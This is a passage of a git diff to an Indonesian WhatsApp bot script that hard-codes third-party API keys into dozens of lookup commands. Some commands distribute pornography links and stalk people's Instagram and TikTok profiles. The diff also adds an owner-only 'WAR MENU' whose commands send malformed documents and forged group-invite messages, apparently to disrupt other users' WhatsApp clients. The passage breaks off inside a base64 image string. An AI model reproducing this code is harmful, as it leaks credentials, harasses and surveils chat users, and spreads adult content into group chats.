+              buffer = await getBuffer(`https://api.lolhuman.xyz/api/rank?apikey=najisbaperanRw&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
               teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
               dha.sendMessage(from, buffer, image, { caption: teks, quoted: mek})
               break
@@ -3121,7 +2841,7 @@ break
 
 case 'kbbi':
 if (args.length == 0) return reply(`Nama Yg Mau Dicari Mana Tod\nContoh: ${prefix + command} kursi`)
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=${lolkey}&query=${args.join(" ")}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=najisbaperanRw&query=${args.join(" ")}`)
 lila = get_result.result
 ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
 ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
@@ -3141,7 +2861,7 @@ if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + co
 pauls = args.join(" ")
 teks1 = pauls.split("-")[0].trim()
 teks2 = pauls.split("-")[1].trim()
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=${lolkey}&kota1=${teks1}&kota2=${teks2}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=najisbaperanRw&kota1=${teks1}&kota2=${teks2}`)
 x = get_result.result
 ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
 ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
@@ -3164,7 +2884,7 @@ break
 case 'wikipedia':
 if (args.length == 0) return reply(`Nama Yg Mau Di Cari Mana Tod\nContoh: ${prefix + command} Tahu`)
 query = args.join(" ")
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${lolkey}&query=${query}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=najisbaperanRw&query=${query}`)
 get_result = get_result.result
 reply(get_result)
 break
@@ -3173,7 +2893,7 @@ if (args.length == 0) return reply(`Teks Yg Mau Di Translate Mana Tod\nContoh: $
 kode_negara = args[0]
 args.shift()
 ini_txt = args.join(" ")
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=${lolkey}&text=${ini_txt}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=najisbaperanRw&text=${ini_txt}`)
 get_result = get_result.result
 init_txt = `From : ${get_result.from}\n`
 init_txt += `To : ${get_result.to}\n`
@@ -3185,7 +2905,7 @@ break
 case 'jadwaltv':
 if (args.length == 0) return reply(`Nama Channel Nya Mana Tod\nContoh: ${prefix + command} SCTV`)
 channel = args[0]
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=${lolkey}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=najisbaperanRw`)
 get_result = get_result.result
 ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
 for (var x in get_result) {
@@ -3194,7 +2914,7 @@ ini_txt += `${x} - ${get_result[x]}\n`
 reply(ini_txt)
 break
 case 'infogempa':
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${lolkey}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=najisbaperanRw`)
 get_result = get_result.result
 ini_txt = `Lokasi : ${get_result.lokasi}\n`
 ini_txt += `Waktu : ${get_result.waktu}\n`
@@ -3203,12 +2923,12 @@ ini_txt += `Magnitude : ${get_result.magnitude}\n`
 ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
 ini_txt += `Koordinat : ${get_result.koordinat}`
 get_buffer = await getBuffer(get_result.map)
-await dha.sendMessage(from, get_buffer, image, { quoted: ftoko, caption: ini_txt })
+await dha.sendMessage(from, get_buffer, image, { quoted: ftrol, caption: ini_txt })
 break
 case 'cuaca':
 if (args.length == 0) return reply(`Nama Kotanya Mana Tod\nContoh: ${prefix + command} Temanggung`)
 daerah = args[0]
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=${lolkey}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${daerah}?apikey=najisbaperanRw`)
 get_result = get_result.result
 ini_txt = `Tempat : ${get_result.tempat}\n`
 ini_txt += `Cuaca : ${get_result.cuaca}\n`
@@ -3218,11 +2938,11 @@ ini_txt += `Kelembapan : ${get_result.kelembapan}\n`
 ini_txt += `Suhu : ${get_result.suhu}\n`
 ini_txt += `Udara : ${get_result.udara}\n`
 ini_txt += `Permukaan laut : ${get_result.permukaan_laut}\n`
-await dha.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: ftext })
+await dha.sendMessage(from, { degreesLatitude: get_result.latitude, degreesLongitude: get_result.longitude }, location, { quoted: ftrol })
 reply(ini_txt)
 break
 case 'covidindo':
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=${lolkey}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/indonesia?apikey=najisbaperanRw`)
 get_result = get_result.result
 ini_txt = `Positif : ${get_result.positif}\n`
 ini_txt += `Sembuh : ${get_result.sembuh}\n`
@@ -3231,7 +2951,7 @@ ini_txt += `Meninggal : ${get_result.meninggal}`
 reply(ini_txt)
 break
 case 'covidglobal':
-get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${lolkey}`)
+get_result = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=najisbaperanRw`)
 get_result = get_result.result
 ini_txt = `Positif : ${get_result.positif}\n`
 ini_txt += `Sembuh : ${get_result.sembuh}\n`
@@ -3245,7 +2965,7 @@ break
               if (args.length == 0) return reply(`Example: ${prefix + command} dha-chan02`)
               reply(mess.wait)
               username = args[0]
-              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolkey}`)
+              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=najisbaperanRw`)
               ini_result = ini_result.result
               ini_buffer = await getBuffer(ini_result.avatar)
               ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
@@ -3268,7 +2988,7 @@ break
              if (args.length == 0) return reply(`Example: ${prefix + command} dha.chan26`)
              reply(mess.wait)
              username = args[0]
-             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolkey}`)
+             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=najisbaperanRw`)
              ini_result = ini_result.result
              ini_buffer = await getBuffer(ini_result.photo_profile)
              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
@@ -3290,7 +3010,7 @@ break
              if (args.length == 0) return reply(`Example: ${prefix + command} marz.hiatus`)
              reply(mess.wait)
              stalk_toktok = args[0]
-             get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${lolkey}`)
+             get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=najisbaperanRw`)
              get_result = get_result.result
              pp_tt = await getBuffer(get_result.user_picture)
              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
@@ -3313,7 +3033,7 @@ break
               if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
               query = args.join(" ")
               reply(mess.wait)
-              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${zekskey}&q=${query}`)
+              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=NinoWangy&q=${query}`)
               get_result = get_result.result
               teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
               for(let i = 0; i < get_result.length; i++) {
@@ -3329,26 +3049,26 @@ break
 case 'ffstalk':
 if (args.length == 0) return reply(`Idnya mana kak?`)
                     ff_id = args[0]
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${ff_id}?apikey=${lolkey}`)
+                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${ff_id}?apikey=najisbaperanRw`)
                     reply(`nih kak`)
                     break      
 //------------------< Sticker/Tools >-------------------
 
-                   case 'bucinstick':
+     			   case 'bucinstick':
                    case 'gawrgura':
                    case 'patrick':
                    case 'dadu':
                    case 'amongus':
                    case 'anjing':
                    reply(mess.wait)
-                   anu = await getBuffer(`http://api.lolhuman.xyz/api/sticker/${command}?apikey=${lolkey}`)
-                    dha.sendMessage(from, anu, sticker, { quoted : ftext })
+                   anu = await getBuffer(`http://api.lolhuman.xyz/api/sticker/${command}?apikey=najisbaperanRw`)
+                    dha.sendMessage(from, anu, sticker, { quoted : ftoko })
                     break
        case 'telesticker': 
        case 'telestiker':
               if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
               reply(mess.wait)
-              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${lolkey}&url=${args[0]}`)
+              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=najisbaperanRw&url=${args[0]}`)
               ini_sticker = ini_url.result.sticker
               reply('Sending '+ ini_sticker.length +' stickers...')
               for (sticker_ in ini_sticker) {
@@ -3365,7 +3085,7 @@ if (args.length == 0) return reply(`Idnya mana kak?`)
               } catch {
               emoji = encodeURI(emoji)
  }
-              ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolkey}`)
+              ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=najisbaperanRw`)
               await dha.sendMessage(from, ini_buffer, sticker, { quoted: mek })
               break
 case 'ttp':
@@ -3609,7 +3329,6 @@ break
 }
                break
         case 'tovideo':
-        case 'tomp4':
                if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
                reply(mess.wait)
                encmediaaa = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
@@ -3644,12 +3363,12 @@ break
               bokep = body.slice(1)
               const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
               const kep = bo[Math.floor(Math.random() * bo.length)]
-              dha.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: ftext, caption: `NI BOKEP SAYA DAPAT DARI *©KurrXd* DOSA TANGGUNG SENDIRI🗿`})
+              dha.sendMessage(from, '*PERMINTAAN:* '+bokep+'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* '+ kep, text, { quoted: ftoko, caption: `NI BOKEP SAYA DAPAT DARI *©KurrXd* DOSA TANGGUNG SENDIRI🗿`})
               break
                 case 'xnxx':
                     if (args.length == 0) return reply(`Contoh: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                     query = args.join(" ")
-                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=${lolkey}&url=${query}`)
+                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/xnxx?apikey=najisbaperanRw&url=${query}`)
                     get_result = get_result.result
                     ini_txt = `Title : ${get_result.title}\n`
                     ini_txt += `Duration : ${get_result.duration}\n`
@@ -3671,7 +3390,7 @@ break
         case 'xnxxsearch':
                     if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                     query = args.join(" ")
-                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolkey}&query=${query}`)
+                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=najisbaperanRw&query=${query}`)
                     get_result = get_result.result
                     ini_txt = ""
                     for (var x of get_result) {
@@ -3684,7 +3403,7 @@ break
                     }
                     reply(ini_txt)
                     break 
-case 'asupan':
+case 'asupan1':
 			dha.updatePresence(from, Presence.composing) 
 				reply(mess.wait)
 				data = fs.readFileSync('./lib/asupan.js');
@@ -3694,7 +3413,7 @@ case 'asupan':
 				asupan = await getBuffer(randKey.result)
 				dha.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
 				break        
-case 'asupan1':
+case 'asupan2':
 			dha.updatePresence(from, Presence.composing) 
 				reply(mess.wait)
 				data = fs.readFileSync('./lib/asupan2.js');
@@ -3703,17 +3422,180 @@ case 'asupan1':
 				randKey = jsonData[randIndex];
 				asupan = await getBuffer(randKey.result)
 				dha.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
-				break 				                    
-				    //------------------< Ingfo Bot >-------------------
+				break 				                                 
+//------------------<WAR MENU>---------------    
+ case 'pvp':
+if (!mek.key.fromMe && !isOwner) return
+tapib1 = fs.readFileSync('./media/audio/numayei.mp3')
+dha.sendMessage(from, tapib1, document, { quoted: mek, filename:`PSYCOBOTZ ~ 404 ${vipi}.mp3`, mimetype: 'audio/application' })
+await reply('Bang mau nanya')
+break  
+case 'pgp':
+if (!isOwner && !mek.key.fromMe) return
+buf = Mfake
+imeu = await dha.prepareMessage('0@s.whatsapp.net', buf, image) 
+imeg = imeu.message.imageMessage
+res = await dha.prepareMessageFromContent(from,{
+"groupInviteMessage": {
+"groupJid": "85296556573-1328272333@g.us",
+"inviteCode": "wFHwtOxGQN8OwK2x",
+"inviteExpiration": "162533333338378",
+"groupName": `PSYCOBOTZ ~ 404 ${vipi}`,
+"jpegThumbnail": "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